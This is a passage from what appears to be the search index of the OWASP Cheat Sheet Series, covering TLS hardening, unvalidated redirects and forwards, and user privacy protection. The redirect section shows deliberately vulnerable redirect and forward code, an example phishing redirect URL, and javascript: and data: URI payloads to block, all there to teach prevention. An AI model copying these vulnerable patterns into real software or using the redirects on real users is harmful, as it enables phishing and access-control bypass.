Parameters"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#disable-compression","text":"TLS compression should be disabled in order to protect against a vulnerability (nicknamed CRIME ) which could potentially allow sensitive information such as session cookies to be recovered by an attacker.","title":"Disable Compression"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#patch-cryptographic-libraries","text":"As well as the vulnerabilities in the SSL and TLS protocols, there have also been a large number of historic vulnerability in SSL and TLS libraries, with Heartbleed being the most well known. As such, it is important to ensure that these libraries are kept up to date with the latest security patches.","title":"Patch Cryptographic Libraries"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#test-the-server-configuration","text":"Once the server has been hardened, the configuration should be tested. The OWASP Testing Guide chapter on SSL/TLS Testing contains further information on testing. There are a number of online tools that can be used to quickly validate the configuration of a server, including: SSL Labs Server Test CryptCheck CypherCraft Hardenize ImmuniWeb Observatory by Mozilla Additionally, there are a number of offline tools that can be used: O-Saft - OWASP SSL advanced forensic tool CipherScan CryptoLyzer SSLScan - Fast SSL Scanner SSLyze testssl.sh - Testing any TLS/SSL encryption tls-scan","title":"Test the Server Configuration"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#certificates","text":"","title":"Certificates"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-strong-keys-and-protect-them","text":"The private key used to generate the cipher key must be sufficiently strong for the anticipated lifetime of the private key and corresponding certificate. The current best practice is to select a key size of at least 2048 bits. Additional information on key lifetimes and comparable key strengths can be found here and in NIST SP 800-57 . The private key should also be protected from unauthorised access using filesystem permissions and other technical and administrative controls.","title":"Use Strong Keys and Protect Them"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-strong-cryptographic-hashing-algorithms","text":"Certificates should use SHA-256 for the hashing algorithm, rather than the older MD5 and SHA-1 algorithms. These have a number of cryptographic weaknesses, and are not trusted by modern browsers.","title":"Use Strong Cryptographic Hashing Algorithms"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-correct-domain-names","text":"The domain name (or subject) of the certificate must match the fully qualified name of the server that presents the certificate. Historically this was stored in the commonName (CN) attribute of the certificate. However, modern versions of Chrome ignore the CN attribute, and require that the FQDN is in the subjectAlternativeName (SAN) attribute. For compatibility reasons, certificates should have the primary FQDN in the CN, and the full list of FQDNs in the SAN. Additionally, when creating the certificate, the following should be taken into account: Consider whether the \"www\" subdomain should also be included. Do not include non-qualified hostnames. Do not include IP addresses. Do not include internal domain names on externally facing certificates. If a server is accessible using both internal and external FQDNs, configure it with multiple certificates.","title":"Use Correct Domain Names"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#carefully-consider-the-use-of-wildcard-certificates","text":"Wildcard certificates can be convenient, however they violate the principal of least privilege , as a single certificate is valid for all subdomains of a domain (such as *.example.org). Where multiple systems are sharing a wildcard certificate, the likelihood that the private key for the certificate is compromised increases, as the key may be present on multiple systems. Additionally, the value of this key is significantly increased, making it a more attractive target for attackers. The issues around the use of wildcard certificates are complicated, and there are various other discussions of them online. When risk assessing the use of wildcard certificates, the following areas should be considered: Only use wildcard certificates where there is a genuine need, rather than for convenience. Consider the use of the ACME to allow systems to automatically request and update their own certificates instead. Never use a wildcard certificates for systems at different trust levels. Two VPN gateways could use a shared wildcard certificate. Multiple instances of a web application could share a certificate. A VPN gateway and a public webserver should not share a wildcard certificate. A public webserver and an internal server should not share a wildcard certificate. Consider the use of a reverse proxy server which performs TLS termination, so that the wildcard private key is only present on one system. A list of all systems sharing a certificate should be maintained to allow them all to be updated if the certificate expires or is compromised. Limit the scope of a wildcard certificate by issuing it for a subdomain (such as *.foo.example.org ), or a for a separate domain.","title":"Carefully Consider the use of Wildcard Certificates"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-an-appropriate-certification-authority-for-the-applications-user-base","text":"In order to be trusted by users, certificates must be signed by a trusted certificate authority (CA). For Internet facing applications, this should be one of the CAs which are well-known and automatically trusted by operating systems and browsers. The LetsEncrypt CA provides free domain validated SSL certificates, which are trusted by all major browsers. As such, consider whether there are any benefits to purchasing a certificate from a CA. For internal applications, an internal CA can be used. This means that the FQDN of the certificate will not be exposed (either to an external CA, or publicly in certificate transparency lists). However, the certificate will only be trusted by users who have imported and trusted the internal CA certificate that was used to sign them.","title":"Use an Appropriate Certification Authority for the Application's User Base"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-caa-records-to-restrict-which-cas-can-issue-certificates","text":"Certification Authority Authorization (CAA) DNS records can be used to define which CAs are permitted to issue certificates for a domain. The records contains a list of CAs, and any CA who is not included in that list should refuse to issue a certificate for the domain. This can help to prevent an attacker from obtaining unauthorised certificates for a domain through a less-reputable CA. Where it is applied to all subdomains, it can also be useful from an administrative perspective by limiting which CAs administrators or developers are able to use, and by preventing them from obtaining unauthorised wildcard certificates.","title":"Use CAA Records to Restrict Which CAs can Issue Certificates"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#always-provide-all-needed-certificates","text":"In order to validate the authenticity of a certificate, the user's browser must examine the certificate that was used to sign it and compare it to the list of CAs trusted by their system. In many cases the certificate is not directly signed by a root CA, but is instead signed by an intermediate CA, which is in turn signed by the root CA. If the user does not know or trust this intermediate CA then the certificate validation will fail, even if the user trusts the ultimate root CA, as they cannot establish a chain of trust between the certificate and the root. In order to avoid this, any intermediate certificates should be provided alongside the main certificate.","title":"Always Provide All Needed Certificates"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#consider-the-use-of-extended-validation-certificates","text":"Extended validation (EV) certificates claim to provide a higher level of verification of the entity, as they perform checks that the requestor is a legitimate legal entity, rather than just verifying the ownership of the domain name like normal (or \"Domain Validated\") certificates. This can effectively be viewed as the difference between \"This site is really run by Example Company Inc.\" vs \"This domain is really example.org\". Historically these displayed differently in the browser, often showing the company name or a green icon or background in the address bar. However, as of 2019 both Chrome and Firefox have announced that they will be removing these indicators, as they do not believe that EV certificates provide any additional protection. There is no security downside to the use of EV certificates. However, as they are significantly more expensive than domain validated certificates, an assessment should be made to determine whether they provide any additional value","title":"Consider the use of Extended Validation Certificates"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#application","text":"","title":"Application"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-tls-for-all-pages","text":"TLS should be used for all pages, not just those that are considered sensitive such as the login page. If there are any pages that do not enforce the use of TLS, these could give an attacker an opportunity to sniff sensitive information such as session tokens, or to inject malicious JavaScript into the responses to carry out other attacks against the user. For public facing applications, it may be appropriate to have the web server listening for unencrypted HTTP connections on port 80, and then immediately redirecting them with a permanent redirect (HTTP 301) in order to provide a better experience to users who manually type in the domain name. This should then be supported with the HTTP Strict Transport Security (HSTS) header to prevent them accessing the site over HTTP in the future.","title":"Use TLS For All Pages"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#do-not-mix-tls-and-non-tls-content","text":"A page that is available over TLS should not include any resources (such as JavaScript or CSS) files which are loaded over unencrypted HTTP. These unencrypted resources could allow an attacker to sniff session cookies or inject malicious code into the page. Modern browsers will also block attempts to load active content over unencrypted HTTP into secure pages.","title":"Do Not Mix TLS and Non-TLS Content"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-the-secure-cookie-flag","text":"All cookies should be marked with the \" Secure \" attribute, which instructs the browser to only send them over encrypted HTTPS connections, in order to prevent them from being sniffed from an unencrypted HTTP connection. This is important even if the website does not listen on HTTP (port 80), as an attacker performing an active man in the middle attack could present a spoofed webserver on port 80 to the user in order to steal their cookie.","title":"Use the \"Secure\" Cookie Flag"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#prevent-caching-of-sensitive-data","text":"Although TLS provides protection of data while it is in transit, it does not provide any protection for data once it has reached the requesting system. As such, this information may be stored in the cache of the user's browser, or by any intercepting proxies which are configured to perform TLS decryption. Where sensitive data is returned in responses, HTTP headers should be used to instruct the browser and any proxy servers not to cache the information, in order to prevent it being stored or returned to other users. This can be achieved by setting the following HTTP headers in the response: Cache-Control: no-cache, no-store, must-revalidate Pragma: no-cache Expires: 0","title":"Prevent Caching of Sensitive Data"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-http-strict-transport-security","text":"HTTP Strict Transport Security (HSTS) instructs the user's browser to always request the site over HTTPS, and also prevents the user from bypassing certificate warnings. See the HTTP Strict Transport Security cheatsheet for further information on implementing HSTS.","title":"Use HTTP Strict Transport Security"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#consider-the-use-of-client-side-certificates","text":"In a typical configuration, TLS is used with a certificate on the server so that the client is able to verify the identity of the server, and to provide an encrypted connection between them. However, there are two main weaknesses with this approach: The server does not have any mechanism to verify the identity of the client The connection can be intercepted by an attacker who is able to obtain a valid certificate for the domain. This is most commonly used by businesses to carry out inspection of TLS traffic by installing a trusted CA certificate on there client systems. Client certificates address both of these issues by requiring that the client proves their identity to the server with their own certificate. This not only provides strong authentication of the identity of the client, but also prevents an intermediate party from performing TLS decryption, even if they have trusted CA certificate on the client system. Client certificates are rarely used on public systems due to a number of issues: Issuing and managing client certificates introduces significant administrative overheads. Non-technical users may struggle to install client certificates. TLS decryption used by many organisations will cause client certificate authentication to fail. However, they should be considered for high-value applications or APIs, especially where there are a small number of technically sophisticated users, or where all users are part of the same organisation.","title":"Consider the use of Client-Side Certificates"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#consider-using-public-key-pinning","text":"Public key pinning can be used to provides assurance that the server's certificate is not only valid and trusted, but also that it matches the certificate expected for the server. This provides protection against an attacker who is able to obtain a valid certificate, either by exploiting a weakness in the validation process, compromising a trusted certificate authority, or having administrative access to the client. Public key pinning was added to browsers in the HTTP Public Key Pinning (HPKP) standard. However, due to a number of issues, it has subsequently been deprecated and is no longer recommended or supported by modern browsers . However, public key pinning can still provide security benefits for mobile applications, thick clients and server-to-server communication. This is discussed in further detail in the Pinning Cheat Sheet .","title":"Consider Using Public Key Pinning"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#related-articles","text":"OWASP - TLS Cipher String Cheat Sheet OWASP - Testing for SSL-TLS , and OWASP Guide to Cryptography OWASP - Application Security Verification Standard (ASVS) - Communication Security Verification Requirements (V9) Mozilla - Mozilla Recommended Configurations NIST - SP 800-52 Rev. 1 Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations NIST - NIST SP 800-57 Recommendation for Key Management, Revision 3 , Public DRAFT NIST - SP 800-95 Guide to Secure Web Services IETF - RFC 5280 Internet X.509 Public Key Infrastructure Certificate and Certificate Revocation List (CRL) Profile IETF - RFC 2246 The Transport Layer Security (TLS) Protocol Version 1.0 (JAN 1999) IETF - RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1 (APR 2006) IETF - RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2 (AUG 2008) Bettercrypto - Applied Crypto Hardening: HOWTO for secure crypto settings of the most common services)","title":"Related Articles"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html","text":"Unvalidated Redirects and Forwards Cheat Sheet \u00b6 Introduction \u00b6 Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access. Safe URL Redirects \u00b6 When we want to redirect a user automatically to another page (without an action of the visitor such as clicking on a hyperlink) you might implement a code such as the following: Java response . sendRedirect ( \"http://www.mysite.com\" ); PHP <?php /* Redirect browser */ header ( \"Location: http://www.mysite.com\" ); /* Exit to prevent the rest of the code from executing */ exit ; ?> ASP .NET Response . Redirect ( \"~/folder/Login.aspx\" ) Rails redirect_to login_path In the examples above, the URL is being explicitly declared in the code and cannot be manipulated by an attacker. Dangerous URL Redirects \u00b6 The following examples demonstrate unsafe redirect and forward code. Dangerous URL Redirect Example 1 \u00b6 The following Java code receives the URL from the parameter named url ( GET or POST ) and redirects to that URL: response . sendRedirect ( request . getParameter ( \"url\" )); The following PHP code obtains a URL from the query string (via the parameter named url ) and then redirects the user to that URL. Additionally, the PHP code after this header() function will continue to execute, so if the user configures their browser to ignore the redirect, they may be able to access the rest of the page. $redirect_url = $_GET['url']; header(\"Location: \" . $redirect_url); A similar example of C# .NET Vulnerable Code: string url = request . QueryString [ \"url\" ]; Response . Redirect ( url ); And in Rails: redirect_to params [ :url ] The above code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site. If no validation is applied, a malicious user could create a hyperlink to redirect your users to an unvalidated malicious website, for example: http://example.com/example.php?url=http://malicious.example.com The user sees the link directing to the original trusted site ( example.com ) and does not realize the redirection that could take place Dangerous URL Redirect Example 2 \u00b6 ASP .NET MVC 1 & 2 websites are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3. The code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter. ASP.NET MVC 2 LogOn action in AccountController.cs (see Microsoft Docs link provided above for the context): [HttpPost] public ActionResult LogOn ( LogOnModel model , string returnUrl ) { if ( ModelState . IsValid ) { if ( MembershipService . ValidateUser ( model . UserName , model . Password )) { FormsService . SignIn ( model . UserName , model . RememberMe ); if (! String . IsNullOrEmpty ( returnUrl )) { return Redirect ( returnUrl ); } else { return RedirectToAction ( \"Index\" , \"Home\" ); } } else { ModelState . AddModelError ( \"\" , \"The user name or password provided is incorrect.\" ); } } // If we got this far, something failed, redisplay form return View ( model ); } Dangerous Forward Example \u00b6 When applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the URL, perform the functions it provides, and it is an appropriate URL request. If the application fails to perform these checks, an attacker crafted URL may pass the application's access control check and then forward the attacker to an administrative function that is not normally permitted. Example: http://www.example.com/function.jsp?fwd=admin.jsp The following code is a Java servlet that will receive a GET request with a URL parameter named fwd in the request to forward to the address specified in the URL parameter. The servlet will retrieve the URL parameter value from the request and complete the server-side forward processing before responding to the browser. public class ForwardServlet extends HttpServlet { protected void doGet ( HttpServletRequest request , HttpServletResponse response ) throws ServletException , IOException { String query = request . getQueryString (); if ( query . contains ( \"fwd\" )) { String fwd = request . getParameter ( \"fwd\" ); try { request . getRequestDispatcher ( fwd ). forward ( request , response ); } catch ( ServletException e ) { e . printStackTrace (); } } } } Preventing Unvalidated Redirects and Forwards \u00b6 Safe use of redirects and forwards can be done in a number of ways: Simply avoid using redirects and forwards. If used, do not allow the URL as user input for the destination. Where possible, have the user provide short name, ID or token which is mapped server-side to a full target URL. This provides the highest degree of protection against the attack tampering with the URL. Be careful that this doesn't introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets If user input can\u2019t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user. Sanitize input by creating a list of trusted URLs (lists of hosts or a regex). This should be based on a white-list approach, rather than a blacklist. Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm. Validating URLs \u00b6 When attempting to validate and sanitise user-input to determine whether the URL is safe, wherever possible you should use a built-in library or function to parse the URLs, such as parse_url() in PHP, rather than rolling your own parser using regex. Additionally, make sure that you take the following into account: Input starting with a / to redirect to local pages is not safe . //example.org is a valid URL. Input starting with the desired domain name is not safe . https://example.org.attacker.com is valid. Only allow HTTP(S) protocols. All other protocols, including JavaScript URIs such as javascript:alert(1) should be blocked Data URIs such as data:text/html,<script>alert(document.domain)</script> should be blocked URIs containing CRLF characters can lead to header injection or response splitting attacks, and should be blocked. References \u00b6 CWE Entry 601 on Open Redirects . WASC Article on URL Redirector Abuse Google blog article on the dangers of open redirects . Preventing Open Redirection Attacks (C#) .","title":"Unvalidated Redirects and Forwards"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#unvalidated-redirects-and-forwards-cheat-sheet","text":"","title":"Unvalidated Redirects and Forwards Cheat Sheet"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#introduction","text":"Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access.","title":"Introduction"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#safe-url-redirects","text":"When we want to redirect a user automatically to another page (without an action of the visitor such as clicking on a hyperlink) you might implement a code such as the following: Java response . sendRedirect ( \"http://www.mysite.com\" ); PHP <?php /* Redirect browser */ header ( \"Location: http://www.mysite.com\" ); /* Exit to prevent the rest of the code from executing */ exit ; ?> ASP .NET Response . Redirect ( \"~/folder/Login.aspx\" ) Rails redirect_to login_path In the examples above, the URL is being explicitly declared in the code and cannot be manipulated by an attacker.","title":"Safe URL Redirects"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#dangerous-url-redirects","text":"The following examples demonstrate unsafe redirect and forward code.","title":"Dangerous URL Redirects"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#dangerous-url-redirect-example-1","text":"The following Java code receives the URL from the parameter named url ( GET or POST ) and redirects to that URL: response . sendRedirect ( request . getParameter ( \"url\" )); The following PHP code obtains a URL from the query string (via the parameter named url ) and then redirects the user to that URL. Additionally, the PHP code after this header() function will continue to execute, so if the user configures their browser to ignore the redirect, they may be able to access the rest of the page. $redirect_url = $_GET['url']; header(\"Location: \" . $redirect_url); A similar example of C# .NET Vulnerable Code: string url = request . QueryString [ \"url\" ]; Response . Redirect ( url ); And in Rails: redirect_to params [ :url ] The above code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site. If no validation is applied, a malicious user could create a hyperlink to redirect your users to an unvalidated malicious website, for example: http://example.com/example.php?url=http://malicious.example.com The user sees the link directing to the original trusted site ( example.com ) and does not realize the redirection that could take place","title":"Dangerous URL Redirect Example 1"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#dangerous-url-redirect-example-2","text":"ASP .NET MVC 1 & 2 websites are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3. The code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter. ASP.NET MVC 2 LogOn action in AccountController.cs (see Microsoft Docs link provided above for the context): [HttpPost] public ActionResult LogOn ( LogOnModel model , string returnUrl ) { if ( ModelState . IsValid ) { if ( MembershipService . ValidateUser ( model . UserName , model . Password )) { FormsService . SignIn ( model . UserName , model . RememberMe ); if (! String . IsNullOrEmpty ( returnUrl )) { return Redirect ( returnUrl ); } else { return RedirectToAction ( \"Index\" , \"Home\" ); } } else { ModelState . AddModelError ( \"\" , \"The user name or password provided is incorrect.\" ); } } // If we got this far, something failed, redisplay form return View ( model ); }","title":"Dangerous URL Redirect Example 2"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#dangerous-forward-example","text":"When applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the URL, perform the functions it provides, and it is an appropriate URL request. If the application fails to perform these checks, an attacker crafted URL may pass the application's access control check and then forward the attacker to an administrative function that is not normally permitted. Example: http://www.example.com/function.jsp?fwd=admin.jsp The following code is a Java servlet that will receive a GET request with a URL parameter named fwd in the request to forward to the address specified in the URL parameter. The servlet will retrieve the URL parameter value from the request and complete the server-side forward processing before responding to the browser. public class ForwardServlet extends HttpServlet { protected void doGet ( HttpServletRequest request , HttpServletResponse response ) throws ServletException , IOException { String query = request . getQueryString (); if ( query . contains ( \"fwd\" )) { String fwd = request . getParameter ( \"fwd\" ); try { request . getRequestDispatcher ( fwd ). forward ( request , response ); } catch ( ServletException e ) { e . printStackTrace (); } } } }","title":"Dangerous Forward Example"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#preventing-unvalidated-redirects-and-forwards","text":"Safe use of redirects and forwards can be done in a number of ways: Simply avoid using redirects and forwards. If used, do not allow the URL as user input for the destination. Where possible, have the user provide short name, ID or token which is mapped server-side to a full target URL. This provides the highest degree of protection against the attack tampering with the URL. Be careful that this doesn't introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets If user input can\u2019t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user. Sanitize input by creating a list of trusted URLs (lists of hosts or a regex). This should be based on a white-list approach, rather than a blacklist. Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm.","title":"Preventing Unvalidated Redirects and Forwards"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#validating-urls","text":"When attempting to validate and sanitise user-input to determine whether the URL is safe, wherever possible you should use a built-in library or function to parse the URLs, such as parse_url() in PHP, rather than rolling your own parser using regex. Additionally, make sure that you take the following into account: Input starting with a / to redirect to local pages is not safe . //example.org is a valid URL. Input starting with the desired domain name is not safe . https://example.org.attacker.com is valid. Only allow HTTP(S) protocols. All other protocols, including JavaScript URIs such as javascript:alert(1) should be blocked Data URIs such as data:text/html,<script>alert(document.domain)</script> should be blocked URIs containing CRLF characters can lead to header injection or response splitting attacks, and should be blocked.","title":"Validating URLs"},{"location":"cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#references","text":"CWE Entry 601 on Open Redirects . WASC Article on URL Redirector Abuse Google blog article on the dangers of open redirects . Preventing Open Redirection Attacks (C#) .","title":"References"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html","text":"User Privacy Protection Cheat Sheet \u00b6 Introduction \u00b6 This OWASP Cheat Sheet introduces mitigation methods that web developers may utilize in order to protect their users from a vast array of potential threats and aggressions that might try to undermine their privacy and anonymity. This cheat sheet focuses on privacy and anonymity threats that users might face by using online services, especially in contexts such as social networking and communication platforms. Guidelines \u00b6 Strong Cryptography \u00b6 Any online platform that handles user identities, private information or communications must be secured with the use of strong cryptography. User communications must be encrypted in transit and storage. User secrets such as passwords must also be protected using strong, collision-resistant hashing algorithms with increasing work factors, in order to greatly mitigate the risks of exposed credentials as well as proper integrity control. To protect data in transit, developers must use and adhere to TLS/SSL best practices such as verified certificates, adequately protected private keys, usage of strong ciphers only, informative and clear warnings to users, as well as sufficient key lengths. Private data must be encrypted in storage using keys with sufficient lengths and under strict access conditions, both technical and procedural. User credentials must be hashed regardless of whether or not they are encrypted in storage. For detailed guides about strong cryptography and best practices, read the following OWASP references: Cryptographic Storage Cheat Sheet . Authentication Cheat Sheet . Transport Layer Protection Cheat Sheet . Guide to Cryptography . Testing for TLS/SSL . Support HTTP Strict Transport Security \u00b6 HTTP Strict Transport Security (HSTS) is an HTTP header set by the server indicating to the user agent that only secure (HTTPS) connections are accepted, prompting the user agent to change all insecure HTTP links to HTTPS, and forcing the compliant user agent to fail-safe by refusing any TLS/SSL connection that is not trusted by the user. HSTS has average support on popular user agents, such as Mozilla Firefox and Google Chrome. Nevertheless, it remains very useful for users who are in consistent fear of spying and Man in the Middle Attacks. If it is impractical to force HSTS on all users, web developers should at least give users the choice to enable it if they wish to make use of it. For more details regarding HSTS, please visit: HTTP Strict Transport Security in Wikipedia . IETF for HSTS RFC . OWASP Appsec Tutorial Series - Episode 4: Strict Transport Security . Digital Certificate Pinning \u00b6 Certificate Pinning is the practice of hardcoding or storing a predefined set of information (usually hashes) for digital certificates/public keys in the user agent (be it web browser, mobile app or browser plugin) such that only the predefined certificates/public keys are used for secure communication, and all others will fail, even if the user trusted (implicitly or explicitly) the other certificates/public keys. Some advantages for pinning are: In the event of a CA compromise, in which a compromised CA trusted by a user can issue certificates for any domain, allowing evil perpetrators to eavesdrop on users. In environments where users are forced to accept a potentially-malicious root CA, such as corporate environments or national PKI schemes. In applications where the target demographic may not understand certificate warnings, and is likely to just allow any invalid certificate. For details regarding certificate pinning, please refer to the following: OWASP Certificate Pinning Cheat Sheet . Public Key Pinning Extension for HTTP RFC . Securing the SSL channel against man-in-the-middle attacks: Future technologies - HTTP Strict Transport Security and and Pinning of Certs, by Tobias Gondrom . Panic Modes \u00b6 A panic mode is a mode that threatened users can refer to when they fall under direct threat to disclose account credentials. Giving users the ability to create a panic mode can help them survive these threats, especially in tumultuous regions around the world. Unfortunately many users around the world are subject to types of threats that most web developers do not know of or take into account. Examples of panic modes are modes where distressed users can delete their data upon threat, log into fake inboxes/accounts/systems, or invoke triggers to backup/upload/hide sensitive data. The appropriate panic mode to implement differs depending on the application type. A disk encryption software such as VeraCrypt might implement a panic mode that starts up a fake system partition if the user entered their distressed password. Email providers might implement a panic mode that hides predefined sensitive emails or contacts, allowing reading innocent email messages only, usually as defined by the user, while preventing the panic mode from overtaking the actual account. An important note about panic modes is that they must not be easily discoverable, if at all. An adversary inside a victim's panic mode must not have any way, or as few possibilities as possible, of finding out the truth. This means that once inside a panic mode, most non-sensitive normal operations must be allowed to continue (such as sending or receiving email), and that further panic modes must be possible to create from inside the original panic mode (If the adversary tried to create a panic mode on a victim's panic mode and failed, the adversary would know they were already inside a panic mode, and might attempt to hurt the victim). Another solution would be to prevent panic modes from being generated from the user account, and instead making it a bit harder to spoof by adversaries. For example it could be only created Out Of Band, and adversaries must have no way to know a panic mode already exists for that particular account. The implementation of a panic mode must always aim to confuse adversaries and prevent them from reaching the actual accounts/sensitive data of the victim, as well as prevent the discovery of any existing panic modes for a particular account. For more details regarding VeraCrypt's hidden operating system mode, please refer to: VeraCrypt Hidden Operating System . Remote Session Invalidation \u00b6 In case user equipment is lost, stolen or confiscated, or under suspicion of cookie theft; it might be very beneficial for users to able to see view their current online sessions and disconnect/invalidate any suspicious lingering sessions, especially ones that belong to stolen or confiscated devices. Remote session invalidation can also helps if a user suspects that their session details were stolen in a Man-in-the-Middle attack. For details regarding session management, please refer to: OWASP Session Management Cheat Sheet . Allow Connections from Anonymity Networks \u00b6 Anonymity networks, such as the Tor Project, give users in tumultuous regions around the world a golden chance to escape surveillance, access information or break censorship barriers. More often than not, activists in troubled regions use such networks to report injustice or send uncensored information to the rest of the world, especially mediums such as social networks, media streaming websites and email providers. Web developers and network administrators must pursue every avenue to enable users to access services from behind such networks, and any policy made against such anonymity networks need to be carefully re-evaluated with respect to impact on people around the world. If possible, application developers should try to integrate or enable easy coupling of their applications with these anonymity networks, such as supporting SOCKS proxies or integration libraries (e.g. OnionKit for Android). For more information about anonymity networks, and the user protections they provide, please refer to: The Tor Project . I2P Network . OnionKit: Boost Network Security and Encryption in your Android Apps . Prevent IP Address Leakage \u00b6 Preventing leakage of user IP addresses is of great significance when user protection is in scope. Any application that hosts external third-party content, such as avatars, signatures or photo attachments; must take into account the benefits of allowing users to block third-party content from being loaded in the application page. If it was possible to embed 3rd-party, external domain images, for example, in a user's feed or timeline; an adversary might use it to discover a victim's real IP address by hosting it on his domain and watch for HTTP requests for that image. Many web applications need user content to operate, and this is completely acceptable as a business process; however web developers are advised to consider giving users the option of blocking external content as a precaution. This applies mainly to social networks and forums, but can also apply to web-based e-mail, where images can be embedded in HTML-formatted emails. A similar issue exists in HTML-formatted emails that contain third-party images, however most email clients and providers block loading of third-party content by default; giving users better privacy and anonymity protection. Honesty & Transparency \u00b6 If the web application cannot provide enough legal or political protections to the user, or if the web application cannot prevent misuse or disclosure of sensitive information such as logs, the truth must be told to the users in a clear understandable form, so that users can make an educated choice about whether or not they should use that particular service. If it doesn't violate the law, inform users if their information is being requested for removal or investigation by external entities. Honesty goes a long way towards cultivating a culture of trust between a web application and its users, and it allows many users around the world to weigh their options carefully, preventing harm to users in various contrasting regions around the world. More insight regarding secure logging can be found at: OWASP Logging Cheat Sheet","title":"User Privacy Protection"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#user-privacy-protection-cheat-sheet","text":"","title":"User Privacy Protection Cheat Sheet"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#introduction","text":"This OWASP Cheat Sheet introduces mitigation methods that web developers may utilize in order to protect their users from a vast array of potential threats and aggressions that might try to undermine their privacy and anonymity. This cheat sheet focuses on privacy and anonymity threats that users might face by using online services, especially in contexts such as social networking and communication platforms.","title":"Introduction"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#guidelines","text":"","title":"Guidelines"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#strong-cryptography","text":"Any online platform that handles user identities, private information or communications must be secured with the use of strong cryptography. User communications must be encrypted in transit and storage. User secrets such as passwords must also be protected using strong, collision-resistant hashing algorithms with increasing work factors, in order to greatly mitigate the risks of exposed credentials as well as proper integrity control. To protect data in transit, developers must use and adhere to TLS/SSL best practices such as verified certificates, adequately protected private keys, usage of strong ciphers only, informative and clear warnings to users, as well as sufficient key lengths. Private data must be encrypted in storage using keys with sufficient lengths and under strict access conditions, both technical and procedural. User credentials must be hashed regardless of whether or not they are encrypted in storage. For detailed guides about strong cryptography and best practices, read the following OWASP references: Cryptographic Storage Cheat Sheet . Authentication Cheat Sheet . Transport Layer Protection Cheat Sheet . Guide to Cryptography . Testing for TLS/SSL 